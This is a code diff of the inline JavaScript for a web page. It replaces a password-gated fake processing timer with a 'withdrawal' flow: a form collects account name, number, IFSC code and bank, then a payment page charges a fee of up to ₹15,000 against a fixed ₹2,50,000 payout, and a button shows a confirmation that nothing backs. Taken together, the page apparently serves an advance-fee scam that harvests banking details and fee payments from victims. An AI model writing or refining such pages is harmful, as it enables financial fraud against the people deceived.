-      let endTime = localStorage.getItem(STORAGE_KEY);
-      if (!endTime) {
-        endTime = Date.now() + (60 * 60 * 1000);
-        localStorage.setItem(STORAGE_KEY, endTime);
+    // search filter
+    window.filterBanks = function() {
+      const query = document.getElementById('bankSearch').value.toLowerCase().trim();
+      const options = bankSelect.options;
+      let visibleCount = 0;
+      for (let i = 0; i < options.length; i++) {
+        const txt = options[i].text.toLowerCase();
+        if (txt.includes(query)) {
+          options[i].style.display = '';
+          visibleCount++;
+        } else {
+          options[i].style.display = 'none';
+        }
       }
-      return parseInt(endTime);
-    }
-
-    function updateTimer() {
-      const endTime = getTimerEndTime();
-      const startTime = endTime - (60 * 60 * 1000);
-      const now = Date.now();
-      let remaining = Math.max(0, endTime - now);
-      
-      const totalDuration = 60 * 60 * 1000;
-      const elapsed = now - startTime;
-      const progressPercent = Math.min(100, Math.max(0, Math.floor((elapsed / totalDuration) * 100)));
-      
-      progressBar.style.width = progressPercent + '%';
-
-      const hours = Math.floor(remaining / (1000 * 60 * 60));
-      remaining -= hours * 1000 * 60 * 60;
-      const minutes = Math.floor(remaining / (1000 * 60));
-      remaining -= minutes * 1000 * 60;
-      const seconds = Math.floor(remaining / 1000);
-
-      timerHours.textContent = String(hours).padStart(2, '0');
-      timerMinutes.textContent = String(minutes).padStart(2, '0');
-      timerSeconds.textContent = String(seconds).padStart(2, '0');
-
-      if (hours === 0 && minutes === 0 && seconds === 0) {
-        statusText.textContent = 'Completed ✓';
-        statusText.className = 'status-value completed';
-        progressBar.style.width = '100%';
-        if (timerInterval) clearInterval(timerInterval);
-      } else if (progressPercent > 70) {
-        statusText.textContent = 'Finalizing...';
-      } else if (progressPercent > 30) {
-        statusText.textContent = 'Processing...';
+      // if only one visible, auto-select it
+      if (visibleCount === 1) {
+        for (let i = 0; i < options.length; i++) {
+          if (options[i].style.display !== 'none') {
+            bankSelect.value = options[i].value;
+            break;
+          }
+        }
       }
-    }
+    };
 
-    function startTimer() {
-      getTimerEndTime();
-      updateTimer();
-      if (timerInterval) clearInterval(timerInterval);
-      timerInterval = setInterval(updateTimer, 1000);
-    }
+    // sync search with select change
+    bankSelect.addEventListener('change', function() {
+      document.getElementById('bankSearch').value = this.value;
+    });
 
-    verifyBtn.addEventListener('click', () => {
-      if (passwordInput.value === REQUIRED_PASSWORD) {
-        errorMsg.style.display = 'none';
-        passwordInput.disabled = true;
-        togglePassBtn.disabled = true;
-        verifyBtn.textContent = '✅ Verified';
-        verifyBtn.disabled = true;
-        verifyBtn.style.backgroundColor = '#152d22';
-        verifyBtn.style.color = '#2ed573';
-        verifyBtn.style.boxShadow = '0 4px 0 #0f3d2a';
+    // Speed selection
+    const speedOptions = document.querySelectorAll('.speed-option');
+    let selectedSpeed = 'instant';
+    let selectedFee = 15000;
 
-        processingSection.classList.add('visible');
-        processingSection.scrollIntoView({ behavior: 'smooth' });
-        startTimer();
+    speedOptions.forEach(opt => {
+      opt.addEventListener('click', function() {
+        speedOptions.forEach(o => o.classList.remove('selected'));
+        this.classList.add('selected');
+        selectedSpeed = this.dataset.speed;
+        selectedFee = parseInt(this.dataset.fee);
+        updateContinueBtn();
+      });
+    });
+
+    // Inputs
+    const accName = document.getElementById('accName');
+    const accNumber = document.getElementById('accNumber');
+    const ifscCode = document.getElementById('ifscCode');
+    const continueBtn = document.getElementById('continueBtn');
+
+    function updateContinueBtn() {
+      const name = accName.value.trim();
+      const num = accNumber.value.trim();
+      const ifsc = ifscCode.value.trim();
+      const bank = bankSelect.value;
+      if (name && num && ifsc && bank) {
+        continueBtn.disabled = false;
       } else {
-        errorMsg.style.display = 'block';
-        passwordInput.value = '';
-        passwordInput.focus();
+        continueBtn.disabled = true;
       }
+    }
+
+    [accName, accNumber, ifscCode, bankSelect, document.getElementById('bankSearch')].forEach(el => {
+      el.addEventListener('input', updateContinueBtn);
+      el.addEventListener('change', updateContinueBtn);
     });
 
-    passwordInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') {
-        e.preventDefault();
-        verifyBtn.click();
-      }
+    // Continue -> payment page
+    const mainPage = document.getElementById('mainPage');
+    const paymentPage = document.getElementById('paymentPage');
+
+    continueBtn.addEventListener('click', function() {
+      if (this.disabled) return;
+
+      const name = accName.value.trim() || 'N/A';
+      const num = accNumber.value.trim() || 'N/A';
+      const ifsc = ifscCode.value.trim() || 'N/A';
+      const bank = bankSelect.value || 'N/A';
+      const speedLabel = document.querySelector('.speed-option.selected .label')?.textContent?.trim() || 'Instant';
+      const fee = selectedFee;
+
+      document.getElementById('payAccName').textContent = name;
+      document.getElementById('payAccNum').textContent = num;
+      document.getElementById('payIfsc').textContent = ifsc;
+      document.getElementById('payBank').textContent = bank;
+      document.getElementById('paySpeed').textContent = speedLabel.replace(/·/g,'').trim();
+      document.getElementById('payFee').textContent = '₹' + fee.toLocaleString('en-IN');
+      const total = 250000 + fee;
+      document.getElementById('payTotal').textContent = '₹' + total.toLocaleString('en-IN');
+
+      mainPage.classList.add('hidden');
+      paymentPage.classList.add('active');
     });
 
-    togglePassBtn.addEventListener('click', () => {
-      if (passwordInput.type === 'password') {
-        passwordInput.type = 'text';
-        eyeIcon.classList.remove('fa-eye');
-        eyeIcon.classList.add('fa-eye-slash');
-      } else {
-        passwordInput.type = 'password';
-        eyeIcon.classList.remove('fa-eye-slash');
-        eyeIcon.classList.add('fa-eye');
-      }
+    function goBack() {
+      paymentPage.classList.remove('active');
+      mainPage.classList.remove('hidden');
+    }
+
+    document.getElementById('backFromPayment').addEventListener('click', goBack);
+    document.getElementById('cancelPaymentBtn').addEventListener('click', goBack);
+
+    document.getElementById('paymentDoneBtn').addEventListener('click', function() {
+      alert('✅ Payment confirmation received! Your withdrawal will be processed shortly.');
+      goBack();
     });
 
-    passwordInput.addEventListener('input', () => {
-      if (errorMsg.style.display === 'block') errorMsg.style.display = 'none';
-    });
-
-    backHomeBtn.addEventListener('click', () => {
-      if (timerInterval) clearInterval(timerInterval);
-      passwordInput.disabled = false;
-      togglePassBtn.disabled = false;
-      verifyBtn.textContent = 'Verify & View Status';
-      verifyBtn.disabled = false;
-      verifyBtn.style.backgroundColor = '#12b4ff';
-      verifyBtn.style.color = '#fff';
-      verifyBtn.style.boxShadow = '0 4px 0 #0a84c2';
-      passwordInput.value = '';
-      errorMsg.style.display = 'none';
-      processingSection.classList.remove('visible');
-      divider1.style.display = 'block';
-      window.scrollTo({ top: 0, behavior: 'smooth' });
-    });
-
+    // initial update
+    updateContinueBtn();
+    // set default bank search to first bank
+    if (allBanks.length) {
+      document.getElementById('bankSearch').value = allBanks[0];
+      bankSelect.value = allBanks[0];
+    }
   })();
 </script>
 </body>
